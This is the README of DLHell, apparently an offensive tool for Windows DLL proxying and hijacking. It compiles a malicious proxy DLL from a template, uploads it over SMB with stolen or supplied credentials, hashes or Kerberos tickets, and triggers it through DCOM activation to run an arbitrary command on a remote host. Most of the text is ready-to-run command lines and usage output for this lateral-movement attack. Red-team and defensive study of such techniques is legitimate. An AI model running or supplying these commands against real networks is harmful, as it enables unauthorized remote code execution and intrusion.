# DLHell

DLHell performs DCOM local & remote Windows DLL Proxying.

## Install

The following packages are required (might depend on your distro, the following
example is for Debian 12):

```bash
sudo apt install -y g++-mingw-w64-x86-64-win32 binutils-mingw-w64-x86-64
```

Install pip dependencies:

```bash
pip3 install -r requirements.txt
```

## Quick start

The following command hijacks the `netutils.dll` library on host `10.137.0.48`
from the `template.tpe` template file (C++ source hijack library) which
launches `calc.exe`. Both original & proxy DLL will be placed in the `program
files/windows nt/accessories/` folder of the `C$` share on the remote target.

Please use Impacket syntax for the `-remote-target` option.

```bash
DLHell.py -t template.tpe -c 'calc.exe' -remote-lib 'windows/system32/netutils.dll' -remote-target 'program files/windows nt/accessories/test.dll' -target 'domain/user:password@ip'
```

Kerberos authentication can also be used:

```bash
DLHell.py -t template.tpe -c 'calc.exe' -k -target wks-02.vault-tech.com -progid WordPad.Document.1
```

List available CLSID & ProgIDs:

```bash
DLHell.py -list
```

## Usage

```
 ____  _     _   _      _ _
|  _ \| |   | | | | ___| | |
| | | | |   | |_| |/ _ \ | |
| |_| | |___|  _  |  __/ | |
|____/|_____|_| |_|\___|_|_|

DLHell v1.0

usage: DLHell.py [-h] [-local-lib LOCAL_LIB] [-remote-lib REMOTE_LIB] [-local-target LOCAL_TARGET]
                 [-remote-target REMOTE_TARGET] [-target TARGET] [-clsid CLSID] [-progid PROGID] -t T -c C
                 [-u U] [-l] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                 [-target-ip ip address] [-port [destination port]]

DLL Hell - DLL Proxifier/Hijacker

options:
  -h, --help            show this help message and exit
  -local-lib LOCAL_LIB  Path of the remote library on the local system, ex: version.dll
  -remote-lib REMOTE_LIB
                        Path of the library on the remote system, ex: windows/system32/version.dll. WARNING:
                        Will connect using SMB on C$ share. Admin rights needed. Requires -target
  -local-target LOCAL_TARGET
                        The new name of the local output proxyfied library
  -remote-target REMOTE_TARGET
                        The new name of the remote proxyfied library. WARNING: Will connect using SMB on C$
                        share. Admin rights needed. Requires -target
  -target TARGET        [[domain/]username[:password]@]<targetName or address>
  -clsid CLSID          CLSID of DCOM class to activate
  -progid PROGID        ProgID of DCOM class to activate
  -t T, -template T     Template file to use for lib generation
  -c C, -command C      Command to execute using hijacked lib
  -u U, -user U         Name of the user to hijack (used to put DLLs in localappdata folder)
  -l, -list             Lists vulnerable CLSID & ProgID for DCOM Hijacking

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on
                        target parameters. If valid credentials cannot be found, it will use the ones
                        specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN)
                        specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as
                        target. This is useful when target is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server
```

## Local DLL Proxying

For Local DLL crafting, use the `-local-lib` (name of the proxy DLL) and
`-local-target` (renamed original DLL) options:

```bash
DLHell.py -t template.tpe -c 'calc.exe' -local-lib 'lib/netutils.dll' -local-target 'test.dll'
```

## Remote DLL Proxying (admin privileges required):

For remote DLL hijacking, specify the `-target`, `-remote-lib` (name of the
original DLL on the remote host) and `-local-target` (renamed original DLL)
options:

```bash
DLHell.py -t template.tpe -c 'calc.exe' -target 'domain/user:password@ip' -remote-lib 'windows/system32/PROPSYS.dll' -remote-target 'windows/test.dll'
```

## DCOM DLL Proxying (admin privileges needed)

DCOM DLL Proxying can be exploited using the `-progid` and `-clsid` options.
The list of available CLSIDs & ProgIDs is available with the following command:

```bash
DLHell.py -list
```

You can add new hijacks to the `dcom.json` file which defines paths for
vulnerable libraries:

Then, only the ProgID or CLSID are required to:

- Get the original DLL
- Create and compile the hijack library
- Upload the libraries on the remote host
- Activate the remote DCOM class

Example for ProgID `WordPad.Document.1`:

```bash
DLHell.py -t template.tpe -c 'calc.exe' -target 'domain/user:password@ip' -progid WordPad.Document.1
```

Example for CLSID `73FDDC80-AEA9-101A-98A7-00AA00374959`:

```bash
DLHell.py -t template.tpe -c 'calc.exe' -target 'domain/user:password@ip' -clsid 73FDDC80-AEA9-101A-98A7-00AA00374959
```
